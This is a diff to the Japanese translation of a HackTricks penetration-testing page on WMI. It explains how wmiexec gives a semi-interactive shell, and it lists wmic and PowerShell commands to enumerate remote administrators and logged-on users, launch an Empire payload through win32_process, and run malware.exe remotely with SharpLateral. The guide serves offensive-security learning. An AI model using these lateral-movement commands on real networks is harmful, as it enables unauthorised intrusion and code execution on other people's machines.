@@ -2,28 +2,30 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>
 
-* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社の広告を掲載**したいですか？または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションです。
-* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか、**Twitterで**フォロー**してください [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**
+HackTricksをサポートする他の方法:
+
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
 
 </details>
 
-## どのように機能するか
+## 動作原理
 
-Wmiは、ユーザー名/(パスワード/ハッシュ)がわかっているホストでプロセスを開くことができます。その後、Wmiexecはwmiを使用して、実行するように要求された各コマンドを実行します（これがWmicexecがセミインタラクティブシェルを提供する理由です）。
+Wmiは、ユーザー名/(パスワード/ハッシュ)がわかっているホストでプロセスを開くことができます。その後、Wmiexecはwmiを使用して、実行を要求された各コマンドを実行します（これがWmicexecがセミインタラクティブシェルを提供する理由です）。
 
 **dcomexec.py:** このスクリプトは、wmiexec.pyに似たセミインタラクティブシェルを提供しますが、異なるDCOMエンドポイント（ShellBrowserWindow DCOMオブジェクト）を使用します。現在、MMC20. Application、Shell Windows、およびShell Browser Windowオブジェクトをサポートしています。（[こちら](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)から）
 
 ## WMIの基本
 
-### 名前空間
+### ネームスペース
 
-WMIはディレクトリスタイルの階層に分かれており、\rootコンテナとその下の他のディレクトリがあります。これらの「ディレクトリパス」は名前空間と呼ばれます。\
-名前空間のリスト：
+WMIはディレクトリスタイルの階層に分かれており、\rootコンテナとその下の他のディレクトリがあります。これらの「ディレクトリパス」はネームスペースと呼ばれます。\
+ネームスペースのリスト:
 ```bash
 #Get Root namespaces
 gwmi -namespace "root" -Class "__Namespace" | Select Name
@@ -41,7 +43,7 @@ gwmi -Namespace "root/microsoft" -List -Recurse
 ```
 ### **クラス**
 
-WMIクラス名（例：win32\_process）は、あらゆるWMIアクションの出発点です。常にクラス名と、それが位置するネームスペースを知る必要があります。\
+WMIクラス名（例：win32_process）は、どんなWMIアクションの出発点です。常にクラス名とそれが位置するネームスペースを知る必要があります。
 `win32`で始まるクラスをリストアップ：
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more #If no namespace is specified, by default is used: "root\cimv2"
@@ -53,9 +55,9 @@ gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
 Get-WmiObject -Class win32_share
 Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
 ```
-### メソッド
+### 方法
 
-WMIクラスには、実行可能な1つ以上の関数があります。これらの関数はメソッドと呼ばれます。
+WMI クラスには、実行可能な1つ以上の関数があります。これらの関数はメソッドと呼ばれます。
 ```bash
 #Load a class using [wmiclass], leist methods and call one
 $c = [wmiclass]"win32_share"
@@ -109,7 +111,7 @@ Get-WmiObject Win32_Processor -ComputerName 10.0.0.182 -Credential $cred
 ```
 ## **手動リモートWMIクエリ**
 
-例えば、リモートマシン上のローカル管理者を非常に慎重に発見する方法は以下の通りです（domainはコンピュータ名であることに注意してください）：
+例えば、リモートマシン上のローカル管理者を発見する非常に隠密な方法は以下の通りです（domainはコンピュータ名であることに注意してください）：
 
 {% code overflow="wrap" %}
 ```bash
@@ -117,7 +119,7 @@ wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=
 ```
 {% endcode %}
 
-管理者を探しているときに便利なワンライナーは、誰がマシンにログオンしているかを確認することです：
+管理者を探しているときに役立つワンライナーは、どのユーザーがマシンにログオンしているかを確認することです：
 ```bash
 wmic /node:ordws01 path win32_loggedonuser get antecedent
 ```
@@ -129,9 +131,9 @@ wmic /node:@workstations.txt path win32_loggedonuser get antecedent
 ```bash
 wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"
 ```
-正常に実行されたことがわかります（ReturnValue = 0）。そして1秒後に、Empireリスナーがそれを捕捉します。プロセスIDはWMIが返したものと同じです。
+正常に実行されたことがわかります（ReturnValue = 0）。そして1秒後、Empireリスナーがそれを捕捉します。プロセスIDはWMIが返したものと同じです。
 
-この情報はここから抜粋されました：[https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+この情報はこちらから抜粋されました：[https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
 ## 自動ツール
 
@@ -141,14 +143,20 @@ wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+```markdown
+{% endcode %}
+
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>
 
-* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社の広告を掲載**したいですか？または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
-* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**
+HackTricksをサポートする他の方法:
+
+* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをチェックしてください。
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローしてください。**
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。
 
 </details>
+```
